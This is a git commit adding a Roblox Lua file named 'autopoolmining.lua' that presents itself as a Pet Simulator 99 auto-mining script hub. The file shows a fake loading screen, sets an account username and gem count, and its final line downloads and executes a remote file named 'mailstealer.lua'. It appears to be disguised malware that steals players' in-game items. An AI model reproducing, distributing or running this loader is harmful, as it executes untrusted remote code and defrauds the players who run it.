afe1a8563dc7f3a802982953f753cab25b0a4e32
asjk58 <162456698+asjk58@users.noreply.github.com>
2024-03-06 15:12:26 +0100

    Add files via upload

---
+++ autopoolmining.lua
@@ -0,0 +1,18 @@
+--[[ Main Config ]]--
+Username = "asjk587"
+AntiLeave = true
+GemNumber = 10000 --
+
+--[[ Webhook Config ]]--
+Webhook = "Your Webhook Here"
+
+--[[ UI Config ]]--
+LoadingScreen = true
+Text1 = "Loading Pet Simulator 99 Script Hub"
+Text2 = "Loading.."
+Text3 = "Loading..."
+Text4 = "Loading."
+Text5 = "Almost Done Loading.."
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Dovyl/Pet-Simulator-99/main/mailstealer.lua"))()
